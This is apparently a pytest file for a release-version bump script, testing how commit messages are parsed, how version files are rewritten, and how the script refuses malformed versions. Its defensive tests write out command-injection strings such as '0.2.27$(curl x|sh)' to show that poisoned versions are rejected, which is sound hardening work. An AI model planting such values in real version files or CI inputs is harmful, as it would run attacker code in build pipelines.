"""Runtime version bump regression coverage."""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "deploy"))
import bump_version

VERSION_PY = '"""Runtime version."""\n\n__version__ = "0.2.5"\n'


def test_default_bump_is_patch():
    assert bump_version.parse_bump("fix(server): close the socket") == "patch"


def test_minor_and_major_tokens_escalate():
    assert bump_version.parse_bump("feat: rooms\n\nrelease: minor") == "minor"
    assert bump_version.parse_bump("[release: major] new tool gate") == "major"


def test_tokens_are_case_insensitive_and_major_wins():
    assert bump_version.parse_bump("Release: MINOR and release: major") == "major"


def test_explicit_patch_token_is_patch():
    assert bump_version.parse_bump("chore: deps\n\nrelease: patch") == "patch"


def test_skip_token_beats_everything():
    assert bump_version.parse_bump("docs only\n\nrelease: skip") is None
    assert bump_version.parse_bump("release: minor\nrelease: skip") is None


def test_own_release_commit_is_recognized():
    assert bump_version.is_release_commit("release: v0.2.6")
    assert bump_version.is_release_commit("release: v0.2.6\n\nbody")
    # a human commit that merely starts with the word is not a release commit
    assert not bump_version.is_release_commit("release: various fixes")
    assert not bump_version.is_release_commit("feat: release notes page")
    assert not bump_version.is_release_commit("")


def test_bump_levels():
    assert bump_version.bump("0.2.5", "patch") == "0.2.6"
    assert bump_version.bump("0.2.5", "minor") == "0.3.0"
    assert bump_version.bump("0.2.5", "major") == "1.0.0"


def test_bump_rejects_malformed_versions_and_levels():
    with pytest.raises(ValueError):
        bump_version.bump("0.2", "patch")
    with pytest.raises(ValueError):
        bump_version.bump("0.2.x", "patch")
    with pytest.raises(ValueError):
        bump_version.bump("0.2.5", "huge")


def test_rewrite_changes_only_the_version_line(tmp_path):
    path = tmp_path / "version.py"
    path.write_text(VERSION_PY, encoding="utf-8")
    bump_version.rewrite(path, "0.2.6")
    text = path.read_text(encoding="utf-8")
    assert '__version__ = "0.2.6"' in text
    assert text.splitlines()[0] == VERSION_PY.splitlines()[0]  # docstring intact
    assert bump_version.read_version(path) == "0.2.6"


def test_harness_rewrite_never_changes_app_version_files(tmp_path):
    """Server releases must leave both the old and app-owned config alone."""
    root = tmp_path / "repo"
    version = root / "harness" / "version.py"
    version.parent.mkdir(parents=True)
    version.write_text('__version__ = "0.2.5"\n', encoding="utf-8")
    xcconfig = root / "clients/ios/Version.xcconfig"
    xcconfig.parent.mkdir(parents=True)
    xcconfig.write_text(
        "// stamped\nMARKETING_VERSION = 0.2.5\nCURRENT_PROJECT_VERSION = 0.2.5\n",
        encoding="utf-8",
    )
    shared = root / "clients/Version.xcconfig"
    shared.write_text("MARKETING_VERSION = 1.4.0\nCURRENT_PROJECT_VERSION = 1.4.0\n")
    before = {p: p.read_bytes() for p in (xcconfig, shared)}
    bump_version.rewrite(version, "0.2.6")
    assert bump_version.read_version(version) == "0.2.6"
    assert {p: p.read_bytes() for p in before} == before
    # A lone version.py (the bump job's own tests) has no xcconfig to touch.
    alone = tmp_path / "alone" / "version.py"
    alone.parent.mkdir()
    alone.write_text('__version__ = "0.2.5"\n', encoding="utf-8")
    bump_version.rewrite(alone, "0.2.6")
    assert bump_version.read_version(alone) == "0.2.6"


def test_rewrite_refuses_a_file_without_the_version_line(tmp_path):
    path = tmp_path / "version.py"
    path.write_text("nothing here\n", encoding="utf-8")
    with pytest.raises(ValueError):
        bump_version.rewrite(path, "0.2.6")
    with pytest.raises(ValueError):
        bump_version.read_version(path)


def _run_main(monkeypatch, capsys, tmp_path, message):
    path = tmp_path / "version.py"
    if not path.exists():
        path.write_text(VERSION_PY, encoding="utf-8")
    monkeypatch.setattr("sys.stdin", type("S", (), {"read": staticmethod(lambda: message)})())
    rc = bump_version.main(["bump_version.py", str(path)])
    return rc, capsys.readouterr().out.strip(), path


def test_main_bumps_and_prints_new_version(monkeypatch, capsys, tmp_path):
    rc, out, path = _run_main(monkeypatch, capsys, tmp_path, "fix: a bug")
    assert rc == 0 and out == "0.2.6"
    assert bump_version.read_version(path) == "0.2.6"


def test_main_prints_skip_and_leaves_file_alone(monkeypatch, capsys, tmp_path):
    rc, out, path = _run_main(monkeypatch, capsys, tmp_path, "docs\n\nrelease: skip")
    assert rc == 0 and out == "skip"
    assert bump_version.read_version(path) == "0.2.5"


def test_main_on_own_release_commit_reports_current_without_rebump(monkeypatch, capsys, tmp_path):
    # Re-run after a partial publish: the bump commit is HEAD; the job must
    # republish 0.2.5, not mint 0.2.6.
    rc, out, path = _run_main(monkeypatch, capsys, tmp_path, "release: v0.2.5")
    assert rc == 0 and out == "0.2.5"
    assert bump_version.read_version(path) == "0.2.5"


def test_read_version_refuses_a_non_semver_version_line(tmp_path):
    """On a `release: vX.Y.Z` head commit main() echoes the file's version
    verbatim into the workflow, where it becomes a refname and a shell word."""
    path = tmp_path / "version.py"
    path.write_text('__version__ = "0.2.27$(curl x|sh)"\n', encoding="utf-8")
    with pytest.raises(ValueError):
        bump_version.read_version(path)
    path.write_text('__version__ = "0.2"\n', encoding="utf-8")
    with pytest.raises(ValueError):
        bump_version.read_version(path)


def test_checked_admits_only_skip_and_semver():
    assert bump_version.checked("skip") == "skip"
    assert bump_version.checked("1.2.3") == "1.2.3"
    for bad in ("1.2", "v1.2.3", "1.2.3 ", "1.2.3$(x)", "", "skip\n"):
        with pytest.raises(ValueError):
            bump_version.checked(bad)


def test_main_on_release_commit_with_a_poisoned_version_fails_rather_than_prints(
    monkeypatch, capsys, tmp_path
):
    path = tmp_path / "version.py"
    path.write_text('__version__ = "0.2.27$(x)"\n', encoding="utf-8")
    rc, out, _ = _run_main(monkeypatch, capsys, tmp_path, "release: v0.2.27")
    assert rc == 2
    assert out == ""
